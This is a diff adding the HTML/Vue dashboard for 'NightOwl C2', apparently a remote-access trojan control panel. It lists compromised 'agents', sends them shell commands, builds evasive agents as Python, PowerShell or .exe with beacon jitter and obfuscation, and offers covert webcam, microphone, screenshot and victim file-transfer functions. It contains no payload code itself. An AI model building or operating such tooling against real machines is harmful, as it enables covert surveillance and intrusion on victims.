@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="fr" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NightOwl C2 Dashboard</title>
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        // Auth Check
+        const token = localStorage.getItem('auth_token');
+        if (!token) {
+            window.location.href = '/login.html';
+        }
+        
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        gray: {
+                            900: '#111827',
+                            800: '#1f2937',
+                            700: '#374151',
+                        },
+                        primary: {
+                            500: '#6366f1',
+                            600: '#4f46e5',
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        mono: ['JetBrains Mono', 'monospace'],
+                    }
+                }
+            }
+        }
+    </script>
+    <!-- Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body class="bg-gray-900 text-gray-100 font-sans antialiased h-screen overflow-hidden flex">
+
+    <div id="app" class="flex w-full h-full">
+        <!-- Sidebar -->
+        <aside class="w-64 bg-gray-800 border-r border-gray-700 flex flex-col">
+            <div class="p-6 flex items-center gap-3 border-b border-gray-700">
+                <i class="fa-solid fa-ghost text-primary-500 text-2xl"></i>
+                <h1 class="text-xl font-bold tracking-wider">NIGHTOWL</h1>
+            </div>
+
+            <nav class="flex-1 p-4 space-y-2">
+                <a href="#" @click.prevent="currentView = 'dashboard'" 
+                   :class="{'bg-gray-700 text-white': currentView === 'dashboard', 'text-gray-400 hover:bg-gray-700 hover:text-white': currentView !== 'dashboard'}"
+                   class="flex items-center gap-3 px-4 py-3 rounded-lg transition-colors">
+                    <i class="fa-solid fa-chart-line w-5 text-center"></i>
+                    <span>Dashboard</span>
+                </a>
+                <a href="#" @click.prevent="currentView = 'agents'"
+                   :class="{'bg-gray-700 text-white': currentView === 'agents', 'text-gray-400 hover:bg-gray-700 hover:text-white': currentView !== 'agents'}"
+                   class="flex items-center gap-3 px-4 py-3 rounded-lg transition-colors">
+                    <i class="fa-solid fa-desktop w-5 text-center"></i>
+                    <span>Agents</span>
+                    <span v-if="activeAgentsCount > 0" class="ml-auto bg-green-500 text-white text-xs px-2 py-0.5 rounded-full">{{ activeAgentsCount }}</span>
+                </a>
+                <a href="#" @click.prevent="currentView = 'commands'"
+                   :class="{'bg-gray-700 text-white': currentView === 'commands', 'text-gray-400 hover:bg-gray-700 hover:text-white': currentView !== 'commands'}"
+                   class="flex items-center gap-3 px-4 py-3 rounded-lg transition-colors">
+                    <i class="fa-solid fa-terminal w-5 text-center"></i>
+                    <span>Historique</span>
+                </a>
+                <a href="#" @click.prevent="currentView = 'builder'"
+                   :class="{'bg-gray-700 text-white': currentView === 'builder', 'text-gray-400 hover:bg-gray-700 hover:text-white': currentView !== 'builder'}"
+                   class="flex items-center gap-3 px-4 py-3 rounded-lg transition-colors">
+                    <i class="fa-solid fa-wrench w-5 text-center"></i>
+                    <span>Builder</span>
+                </a>
+            </nav>
+
+            <div class="p-4 border-t border-gray-700">
+                <div class="flex items-center gap-3 text-sm text-gray-400">
+                    <div class="w-2 h-2 rounded-full" :class="connectionStatus === 'connected' ? 'bg-green-500' : 'bg-red-500'"></div>
+                    <span>{{ connectionStatus === 'connected' ? 'Connecté au serveur' : 'Déconnecté' }}</span>
+                </div>
+            </div>
+        </aside>
+
+        <!-- Main Content -->
+        <main class="flex-1 flex flex-col h-full overflow-hidden bg-gray-900">
+            <!-- Header -->
+            <header class="h-16 bg-gray-800 border-b border-gray-700 flex items-center justify-between px-6">
+                <h2 class="text-lg font-medium">{{ viewTitle }}</h2>
+                <div class="flex items-center gap-4">
+                    <button class="text-gray-400 hover:text-white transition-colors">
+                        <i class="fa-solid fa-bell"></i>
+                    </button>
+                    <div class="flex items-center gap-2">
+                        <div class="w-8 h-8 rounded-full bg-primary-600 flex items-center justify-center text-sm font-bold">{{ username ? username.substring(0,2).toUpperCase() : 'OP' }}</div>
+                        <span class="text-sm">{{ username || 'Operator' }}</span>
+                        <button @click="logout" class="ml-2 text-gray-400 hover:text-red-400 transition-colors" title="Logout">
+                            <i class="fa-solid fa-right-from-bracket"></i>
+                        </button>
+                    </div>
+                </div>
+            </header>
+
+            <!-- Content -->
+            <div class="flex-1 overflow-auto p-6">
+                
+                <!-- Dashboard View -->
+                <div v-if="currentView === 'dashboard'" class="space-y-6">
+                    <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                        <!-- Card 1 -->
+                        <div class="bg-gray-800 rounded-xl p-6 border border-gray-700">
+                            <div class="flex justify-between items-start">
+                                <div>
+                                    <p class="text-sm text-gray-400">Active Agents</p>
+                                    <h3 class="text-3xl font-bold mt-2">{{ activeAgentsCount }}</h3>
+                                </div>
+                                <div class="p-3 bg-gray-700 rounded-lg text-green-400">
+                                    <i class="fa-solid fa-network-wired"></i>
+                                </div>
+                            </div>
+                        </div>
+                        <!-- Card 2 -->
+                        <div class="bg-gray-800 rounded-xl p-6 border border-gray-700">
+                            <div class="flex justify-between items-start">
+                                <div>
+                                    <p class="text-sm text-gray-400">Total Sessions</p>
+                                    <h3 class="text-3xl font-bold mt-2">{{ sessions.length }}</h3>
+                                </div>
+                                <div class="p-3 bg-gray-700 rounded-lg text-blue-400">
+                                    <i class="fa-solid fa-users"></i>
+                                </div>
+                            </div>
+                        </div>
+                        <!-- Card 3 -->
+                        <div class="bg-gray-800 rounded-xl p-6 border border-gray-700">
+                            <div class="flex justify-between items-start">
+                                <div>
+                                    <p class="text-sm text-gray-400">Commands (24h)</p>
+                                    <h3 class="text-3xl font-bold mt-2">{{ commandHistory.length }}</h3>
+                                </div>
+                                <div class="p-3 bg-gray-700 rounded-lg text-purple-400">
+                                    <i class="fa-solid fa-terminal"></i>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Recent Activity -->
+                    <div class="bg-gray-800 rounded-xl border border-gray-700 overflow-hidden">
+                        <div class="px-6 py-4 border-b border-gray-700">
+                            <h3 class="font-medium">Recent Activity</h3>
+                        </div>
+                        <div class="p-6">
+                            <div class="space-y-4">
+                                <div v-for="log in recentLogs" :key="log.id" class="flex items-start gap-4 text-sm">
+                                    <span class="text-gray-500 font-mono">{{ log.time }}</span>
+                                    <span :class="log.typeClass">{{ log.message }}</span>
+                                </div>
+                                <div v-if="recentLogs.length === 0" class="text-gray-500 text-center py-4">No recent activity</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Builder View -->
+                <div v-if="currentView === 'builder'" class="space-y-6">
+                    <h2 class="text-2xl font-bold text-white mb-6">Agent Generator</h2>
+                    <div class="bg-gray-800 rounded-xl p-6 border border-gray-700">
+                        <form @submit.prevent="generateAgent" class="space-y-6">
+                            <!-- Server Configuration -->
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                                <div>
+                                    <label class="block text-sm font-medium text-gray-400 mb-2">C2 Server URL</label>
+                                    <input type="text" v-model="builderConfig.server_url" class="w-full bg-gray-900 border border-gray-700 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-primary-500">
+                                </div>
+                                <div>
+                                    <label class="block text-sm font-medium text-gray-400 mb-2">Output Format</label>
+                                    <select v-model="builderConfig.format" class="w-full bg-gray-900 border border-gray-700 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-primary-500">
+                                        <option value="source">Python Source Code (.zip)</option>
+                                        <option value="powershell">PowerShell Script (.ps1)</option>
+                                        <option value="exe">Windows Executable (.exe)</option>
+                                    </select>
+                                </div>
+                            </div>
+
+                            <!-- Beacon Configuration -->
+                            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                                <div>
+                                    <label class="block text-sm font-medium text-gray-400 mb-2">Min Interval (sec)</label>
+                                    <input type="number" v-model="builderConfig.beacon_interval_min" class="w-full bg-gray-900 border border-gray-700 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-primary-500">
+                                </div>
+                                <div>
+                                    <label class="block text-sm font-medium text-gray-400 mb-2">Max Interval (sec)</label>
+                                    <input type="number" v-model="builderConfig.beacon_interval_max" class="w-full bg-gray-900 border border-gray-700 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-primary-500">
+                                </div>
+                                <div>
+                                    <label class="block text-sm font-medium text-gray-400 mb-2">Jitter (0.0 - 1.0)</label>
+                                    <input type="number" step="0.1" v-model="builderConfig.jitter" class="w-full bg-gray-900 border border-gray-700 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-primary-500">
+                                </div>
+                            </div>
+
+                            <!-- Evasion Configuration -->
+                            <div>
+                                <label class="block text-sm font-medium text-gray-400 mb-2">Obfuscation / Evasion Level</label>
+                                <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                                    <div @click="builderConfig.obfuscation = 'none'" :class="{'border-primary-500 bg-primary-500/10': builderConfig.obfuscation === 'none', 'border-gray-700 bg-gray-900': builderConfig.obfuscation !== 'none'}" class="cursor-pointer border rounded-lg p-4 transition-colors">
+                                        <div class="font-bold text-white mb-1">None</div>
+                                        <div class="text-xs text-gray-400">Clear code, ideal for debugging.</div>
+                                    </div>
+                                    <div @click="builderConfig.obfuscation = 'low'" :class="{'border-primary-500 bg-primary-500/10': builderConfig.obfuscation === 'low', 'border-gray-700 bg-gray-900': builderConfig.obfuscation !== 'low'}" class="cursor-pointer border rounded-lg p-4 transition-colors">
+                                        <div class="font-bold text-white mb-1">Low</div>
+                                        <div class="text-xs text-gray-400">Startup delay (2s), random names.</div>
+                                    </div>
+                                    <div @click="builderConfig.obfuscation = 'high'" :class="{'border-primary-500 bg-primary-500/10': builderConfig.obfuscation === 'high', 'border-gray-700 bg-gray-900': builderConfig.obfuscation !== 'high'}" class="cursor-pointer border rounded-lg p-4 transition-colors">
+                                        <div class="font-bold text-white mb-1">High</div>
+                                        <div class="text-xs text-gray-400">Long delay (10s), complex structure, decoys.</div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Action -->
+                            <div class="flex justify-end pt-4">
+                                <button type="submit" :disabled="isGenerating" class="bg-primary-600 hover:bg-primary-500 text-white px-6 py-2 rounded-lg transition-colors flex items-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed">
+                                    <i v-if="isGenerating" class="fa-solid fa-circle-notch fa-spin"></i>
+                                    <i v-else class="fa-solid fa-download"></i>
+                                    <span>{{ isGenerating ? 'Generating...' : 'Generate Agent' }}</span>
+                                </button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+
+                <!-- Agents View -->
+                <div v-if="currentView === 'agents'" class="space-y-6">
+                    <div class="bg-gray-800 rounded-xl border border-gray-700 overflow-hidden">
+                        <div class="overflow-x-auto">
+                            <table class="w-full text-left border-collapse">
+                                <thead>
+                                    <tr class="bg-gray-700/50 text-gray-400 text-xs uppercase tracking-wider">
+                                        <th class="px-6 py-4 font-medium">Status</th>
+                                        <th class="px-6 py-4 font-medium">Hostname</th>
+                                        <th class="px-6 py-4 font-medium">IP Address</th>
+                                        <th class="px-6 py-4 font-medium">CPU / Mem</th>
+                                        <th class="px-6 py-4 font-medium">OS</th>
+                                        <th class="px-6 py-4 font-medium">Dernier Beacon</th>
+                                        <th class="px-6 py-4 font-medium">Actions</th>
+                                    </tr>
+                                </thead>
+                                <tbody class="divide-y divide-gray-700">
+                                    <tr v-for="session in sessions" :key="session.id" class="hover:bg-gray-700/30 transition-colors">
+                                        <td class="px-6 py-4">
+                                            <span v-if="session.status === 'active'" class="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-medium bg-green-500/10 text-green-400 border border-green-500/20">
+                                                <span class="w-1.5 h-1.5 rounded-full bg-green-400"></span> Active
+                                            </span>
+                                            <span v-else class="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-medium bg-gray-600/10 text-gray-400 border border-gray-600/20">
+                                                <span class="w-1.5 h-1.5 rounded-full bg-gray-400"></span> Dead
+                                            </span>
+                                        </td>
+                                        <td class="px-6 py-4 font-medium text-white">{{ session.hostname }}</td>
+                                        <td class="px-6 py-4 font-mono text-gray-300">{{ session.ip_address }}</td>
+                                        <td class="px-6 py-4 text-xs font-mono text-gray-400">
+                                            <div v-if="session.agent_data?.system_stats">
+                                                <div>CPU: {{ session.agent_data.system_stats.cpu_percent }}%</div>
+                                                <div>Mem: {{ session.agent_data.system_stats.memory_percent }}%</div>
+                                            </div>
+                                            <div v-else>-</div>
+                                        </td>
+                                        <td class="px-6 py-4 text-gray-300">Windows 10</td> <!-- Placeholder -->
+                                        <td class="px-6 py-4 text-gray-400 text-xs">{{ formatTime(session.last_activity) }}</td>
+                                        <td class="px-6 py-4">
+                                            <div class="flex gap-3">
+                                                <button @click="showAdvanced(session)" class="text-purple-500 hover:text-purple-400 font-medium text-sm flex items-center gap-1">
+                                                    <i class="fa-solid fa-microchip"></i> Advanced
+                                                </button>
+                                                <button @click="selectAgent(session)" class="text-primary-500 hover:text-primary-400 font-medium text-sm flex items-center gap-1">
+                                                    <i class="fa-solid fa-terminal"></i> Interact
+                                                </button>
+                                                <button @click="showAgentHistory(session.agent_id)" class="text-gray-400 hover:text-white font-medium text-sm flex items-center gap-1">
+                                                    <i class="fa-solid fa-clock-rotate-left"></i> History
+                                                </button>
+                                            </div>
+                                        </td>
+                                    </tr>
+                                    <tr v-if="sessions.length === 0">
+                                        <td colspan="6" class="px-6 py-12 text-center text-gray-500">
+                                            <i class="fa-solid fa-robot text-4xl mb-3 opacity-20"></i>
+                                            <p>No agents connected</p>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Commands View (History) -->
+                <div v-if="currentView === 'commands'" class="space-y-6">
+                    <div class="flex items-center justify-between mb-6">
+                        <h2 class="text-2xl font-bold text-white">
+                            Command History
+                            <span v-if="currentHistoryAgentId" class="text-base font-normal text-gray-400 ml-2">
+                                (Filter: Agent {{ currentHistoryAgentId.substring(0,8) }}...)
+                            </span>
+                        </h2>
+                        <button v-if="currentHistoryAgentId" @click="clearHistoryFilter" class="bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded-lg transition-colors text-sm">
+                            <i class="fa-solid fa-filter-circle-xmark mr-2"></i> Clear Filter
+                        </button>
+                    </div>
+                    
+                    <div class="bg-gray-800 rounded-xl border border-gray-700 overflow-hidden">
+                        <div class="overflow-x-auto">
+                            <table class="w-full text-left border-collapse">
+                                <thead>
+                                    <tr class="bg-gray-700/50 text-gray-400 text-xs uppercase tracking-wider">
+                                        <th class="px-6 py-4 font-medium">Time</th>
+                                        <th class="px-6 py-4 font-medium">Agent</th>
+                                        <th class="px-6 py-4 font-medium">Command</th>
+                                        <th class="px-6 py-4 font-medium">Status</th>
+                                        <th class="px-6 py-4 font-medium">Result</th>
+                                    </tr>
+                                </thead>
+                                <tbody class="divide-y divide-gray-700">
+                                    <tr v-for="cmd in commandHistory" :key="cmd.id" class="hover:bg-gray-700/30 transition-colors">
+                                        <td class="px-6 py-4 text-gray-400 text-xs font-mono">{{ cmd.created_at ? formatTime(cmd.created_at) : '-' }}</td>
+                                        <td class="px-6 py-4">
+                                            <div class="font-medium text-white">{{ cmd.hostname || 'Unknown' }}</div>
+                                            <div class="text-xs text-gray-500 font-mono">{{ cmd.agent_id ? cmd.agent_id.substring(0,8) + '...' : '' }}</div>
+                                        </td>
+                                        <td class="px-6 py-4 font-mono text-sm text-primary-400">{{ cmd.command }} {{ cmd.params }}</td>
+                                        <td class="px-6 py-4">
+                                            <span v-if="cmd.status === 'completed'" class="inline-flex items-center gap-1 px-2 py-0.5 rounded text-xs font-medium bg-green-500/10 text-green-400 border border-green-500/20">
+                                                Success
+                                            </span>
+                                            <span v-else-if="cmd.status === 'error'" class="inline-flex items-center gap-1 px-2 py-0.5 rounded text-xs font-medium bg-red-500/10 text-red-400 border border-red-500/20">
+                                                Error
+                                            </span>
+                                            <span v-else class="inline-flex items-center gap-1 px-2 py-0.5 rounded text-xs font-medium bg-gray-600/10 text-gray-400 border border-gray-600/20">
+                                                {{ cmd.status }}
+                                            </span>
+                                        </td>
+                                        <td class="px-6 py-4 text-sm text-gray-300 max-w-xs truncate" :title="cmd.result">
+                                            {{ cmd.result ? (typeof cmd.result === 'object' ? JSON.stringify(cmd.result) : cmd.result) : '-' }}
+                                        </td>
+                                    </tr>
+                                    <tr v-if="commandHistory.length === 0">
+                                        <td colspan="5" class="px-6 py-12 text-center text-gray-500">
+                                            <i class="fa-solid fa-terminal text-4xl mb-3 opacity-20"></i>
+                                            <p>Aucune commande dans l'historique</p>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Agent Interaction View -->
+                <div v-if="currentView === 'agent_interaction' && selectedAgent" class="h-full flex flex-col gap-4">
+                    <div class="flex items-center gap-4 mb-2">
+                        <button @click="currentView = 'agents'" class="text-gray-400 hover:text-white">
+                            <i class="fa-solid fa-arrow-left"></i>
+                        </button>
+                        <h2 class="text-xl font-bold">{{ selectedAgent.hostname }} <span class="text-gray-500 text-sm font-normal">({{ selectedAgent.ip_address }})</span></h2>
+                        <span class="px-2 py-0.5 rounded text-xs bg-gray-700 text-gray-300">{{ selectedAgent.id }}</span>
+                    </div>
+
+                    <div class="flex-1 bg-gray-950 rounded-xl border border-gray-700 flex flex-col font-mono text-sm shadow-inner overflow-hidden">
+                        <!-- Terminal Output -->
+                        <div class="flex-1 p-4 overflow-y-auto space-y-2" ref="terminalOutput">
+                            <div v-for="line in agentConsoleLogs[selectedAgent.id] || []" :key="line.id" class="break-all whitespace-pre-wrap">
+                                <div v-if="line.type === 'command'" class="text-gray-400">
+                                    <span class="text-primary-500">➜</span> {{ line.content }}
+                                </div>
+                                <div v-else-if="line.type === 'output'" class="text-gray-200 pl-4 border-l-2 border-gray-800">
+                                    {{ line.content }}
+                                </div>
+                                <div v-else-if="line.type === 'error'" class="text-red-400 pl-4 border-l-2 border-red-900/50">
+                                    {{ line.content }}
+                                </div>
+                                <div v-else-if="line.type === 'info'" class="text-blue-400 italic">
+                                    {{ line.content }}
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Input Area -->
+                        <div class="p-4 bg-gray-900 border-t border-gray-800 flex items-center gap-2">
+                            <span class="text-primary-500 font-bold">➜</span>
+                            <input type="text" 
+                                   v-model="commandInput" 
+                                   @keydown.enter="sendCommand"
+                                   placeholder="Enter a command (e.g., whoami, ls, shell {...})..." 
+                                   class="flex-1 bg-transparent border-none outline-none text-white placeholder-gray-600 focus:ring-0"
+                                   :disabled="isSendingCommand"
+                                   ref="commandInputRef">
+                            <div v-if="isSendingCommand" class="animate-spin text-primary-500">
+                                <i class="fa-solid fa-circle-notch"></i>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Quick Actions -->
+                    <div class="flex gap-2 flex-wrap">
+                        <button @click="quickCommand('whoami')" class="px-3 py-1.5 bg-gray-800 hover:bg-gray-700 border border-gray-700 rounded-lg text-xs transition-colors">whoami</button>
+                        <button @click="quickCommand('ifconfig')" class="px-3 py-1.5 bg-gray-800 hover:bg-gray-700 border border-gray-700 rounded-lg text-xs transition-colors">ifconfig</button>
+                        <button @click="quickCommand('ps')" class="px-3 py-1.5 bg-gray-800 hover:bg-gray-700 border border-gray-700 rounded-lg text-xs transition-colors">ps</button>
+                        <button @click="quickCommand('pwd')" class="px-3 py-1.5 bg-gray-800 hover:bg-gray-700 border border-gray-700 rounded-lg text-xs transition-colors">pwd</button>
+                        <button @click="quickCommand('ls')" class="px-3 py-1.5 bg-gray-800 hover:bg-gray-700 border border-gray-700 rounded-lg text-xs transition-colors">ls</button>
+                    </div>
+                </div>
+
+            </div>
+        </main>
+
+        <!-- Advanced Modal -->
+        <div v-if="showAdvancedModal" class="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4">
+            <div class="bg-gray-800 rounded-xl shadow-2xl border border-gray-700 w-full max-w-4xl max-h-[90vh] flex flex-col">
+                <div class="p-6 border-b border-gray-700 flex justify-between items-center bg-gray-900/50 rounded-t-xl">
+                    <h3 class="text-xl font-bold text-white flex items-center gap-3">
+                        <i class="fa-solid fa-user-secret text-red-500"></i>
+                        Advanced Options: <span class="text-gray-400">{{ advancedAgent?.hostname }}</span>
+                    </h3>
+                    <button @click="closeAdvanced" class="text-gray-400 hover:text-white">
+                        <i class="fa-solid fa-xmark text-xl"></i>
+                    </button>
+                </div>
+                
+                <div class="flex flex-1 overflow-hidden">
+                    <!-- Sidebar -->
+                    <div class="w-64 bg-gray-900/30 border-r border-gray-700 p-4 space-y-2">
+                        <button @click="advancedTab = 'surveillance'" :class="{'bg-primary-600 text-white': advancedTab === 'surveillance', 'text-gray-400 hover:text-white hover:bg-gray-700': advancedTab !== 'surveillance'}" class="w-full text-left px-4 py-3 rounded-lg transition-colors flex items-center gap-3">
+                            <i class="fa-solid fa-eye w-5"></i> Surveillance
+                        </button>
+                        <button @click="advancedTab = 'desktop'" :class="{'bg-primary-600 text-white': advancedTab === 'desktop', 'text-gray-400 hover:text-white hover:bg-gray-700': advancedTab !== 'desktop'}" class="w-full text-left px-4 py-3 rounded-lg transition-colors flex items-center gap-3">
+                            <i class="fa-solid fa-desktop w-5"></i> Remote Desktop
+                        </button>
+                        <button @click="advancedTab = 'files'" :class="{'bg-primary-600 text-white': advancedTab === 'files', 'text-gray-400 hover:text-white hover:bg-gray-700': advancedTab !== 'files'}" class="w-full text-left px-4 py-3 rounded-lg transition-colors flex items-center gap-3">
+                            <i class="fa-solid fa-folder-open w-5"></i> Files
+                        </button>
+                    </div>
+
+                    <!-- Content -->
+                    <div class="flex-1 p-6 overflow-y-auto bg-gray-800">
+                        <!-- Surveillance Tab -->
+                        <div v-if="advancedTab === 'surveillance'" class="space-y-6">
+                            <div class="grid grid-cols-2 gap-6">
+                                <div class="bg-gray-700/30 p-6 rounded-xl border border-gray-600/50">
+                                    <h4 class="text-lg font-medium text-white mb-4 flex items-center gap-2">
+                                        <i class="fa-solid fa-camera text-primary-400"></i> Webcam
+                                    </h4>
+                                    <div class="space-y-4">
+                                        <button @click="sendAdvancedCommand('cam_snapshot')" :disabled="isExecutingAdvanced" class="w-full bg-primary-600 hover:bg-primary-500 disabled:opacity-50 text-white py-2 rounded-lg transition-colors">
+                                            <i class="fa-solid fa-camera-retro mr-2"></i> Take Snapshot
+                                        </button>
+                                        <div v-if="lastCamImage" class="mt-4">
+                                            <img :src="lastCamImage" class="w-full rounded border border-gray-600">
+                                            <a :href="lastCamImage" download="snapshot.jpg" class="block text-center text-sm text-primary-400 mt-2 hover:underline">Download</a>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="bg-gray-700/30 p-6 rounded-xl border border-gray-600/50">
+                                    <h4 class="text-lg font-medium text-white mb-4 flex items-center gap-2">
+                                        <i class="fa-solid fa-microphone text-primary-400"></i> Microphone
+                                    </h4>
+                                    <div class="space-y-4">
+                                        <div class="flex gap-2">
+                                            <input type="number" v-model="micDuration" min="1" max="600" class="bg-gray-900 border border-gray-600 text-white rounded px-3 py-2 w-20" placeholder="Sec">
+                                            <button @click="sendAdvancedCommand('mic_record', {duration: micDuration})" :disabled="isExecutingAdvanced" class="flex-1 bg-primary-600 hover:bg-primary-500 disabled:opacity-50 text-white py-2 rounded-lg transition-colors">
+                                                <i class="fa-solid fa-microphone-lines mr-2"></i> Record
+                                            </button>
+                                        </div>
+                                        <div v-if="lastAudio" class="mt-4">
+                                            <audio controls :src="lastAudio" class="w-full"></audio>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Desktop Tab -->
+                        <div v-if="advancedTab === 'desktop'" class="space-y-6">
+                             <div class="bg-gray-700/30 p-6 rounded-xl border border-gray-600/50">
+                                <div class="flex justify-between items-center mb-4">
+                                    <h4 class="text-lg font-medium text-white flex items-center gap-2">
+                                        <i class="fa-solid fa-image text-primary-400"></i> Screenshot
+                                    </h4>
+                                    <button @click="sendAdvancedCommand('screenshot')" :disabled="isExecutingAdvanced" class="bg-primary-600 hover:bg-primary-500 disabled:opacity-50 text-white px-4 py-2 rounded-lg transition-colors text-sm">
+                                        <i class="fa-solid fa-camera mr-2"></i> Capture
+                                    </button>
+                                </div>
+                                <div v-if="lastScreenshot" class="relative group">
+                                    <img :src="lastScreenshot" class="w-full rounded border border-gray-600 shadow-lg">
+                                    <div class="absolute inset-0 bg-black/50 opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center">
+                                        <a :href="lastScreenshot" download="screenshot.png" class="bg-white text-gray-900 px-4 py-2 rounded-full font-medium hover:bg-gray-100">
+                                            <i class="fa-solid fa-download mr-2"></i> Download
+                                        </a>
+                                    </div>
+                                </div>
+                                <div v-else class="h-64 bg-gray-900/50 rounded flex items-center justify-center text-gray-500 border border-gray-700 border-dashed">
+                                    No screenshot captured
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Files Tab -->
+                        <div v-if="advancedTab === 'files'" class="space-y-6">
+                            <div class="bg-gray-700/30 p-6 rounded-xl border border-gray-600/50">
+                                <h4 class="text-lg font-medium text-white mb-4 flex items-center gap-2">
+                                    <i class="fa-solid fa-file-arrow-up text-primary-400"></i> File Transfer
+                                </h4>
+                                
+                                <div class="grid grid-cols-2 gap-6">
+                                    <!-- Upload -->
+                                    <div class="bg-gray-800 p-4 rounded-lg">
+                                        <h5 class="text-sm font-medium text-gray-300 mb-2 flex items-center gap-2">
+                                            Upload to Victim
+                                            <div class="group relative flex items-center">
+                                                <i class="fa-solid fa-circle-info text-gray-500 hover:text-gray-300 cursor-help"></i>
+                                                <div class="absolute bottom-full left-1/2 -translate-x-1/2 mb-2 w-64 p-2 bg-black/90 text-xs text-gray-300 rounded shadow-lg opacity-0 group-hover:opacity-100 transition-opacity pointer-events-none z-10 text-center border border-gray-700">
+                                                    Spécifiez le chemin complet sur la machine victime où le fichier sera enregistré (incluant le nom du fichier).
+                                                </div>
+                                            </div>
+                                        </h5>
+                                        <div class="space-y-2">
+                                            <input type="text" v-model="uploadPath" placeholder="Entrez le chemin de destination (ex: C:\Users\Public\mon_fichier.exe)" class="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-sm text-white">
+                                            <input type="file" ref="fileInput" @change="handleFileUploadSelect" class="w-full text-sm text-gray-400 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-primary-600 file:text-white hover:file:bg-primary-500">
+                                            <button @click="uploadFile" :disabled="isExecutingAdvanced" class="w-full bg-green-600 hover:bg-green-500 disabled:opacity-50 text-white py-2 rounded transition-colors text-sm">
+                                                <i class="fa-solid fa-upload mr-2"></i> Upload
+                                            </button>
+                                        </div>
+                                    </div>
+
+                                    <!-- Download -->
+                                    <div class="bg-gray-800 p-4 rounded-lg">
+                                        <h5 class="text-sm font-medium text-gray-300 mb-2">Download from Victim</h5>
+                                        <div class="space-y-2">
+                                            <input type="text" v-model="downloadPath" placeholder="Remote Path (e.g. C:\Users\User\flag.txt)" class="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-sm text-white">
+                                            <button @click="sendAdvancedCommand('upload_file', {path: downloadPath})" :disabled="isExecutingAdvanced" class="w-full bg-blue-600 hover:bg-blue-500 disabled:opacity-50 text-white py-2 rounded transition-colors text-sm">
+                                                <i class="fa-solid fa-download mr-2"></i> Download
+                                            </button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Vue.js -->
+    <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
+    <script src="js/app.js?v=2"></script>
+</body>
+</html>
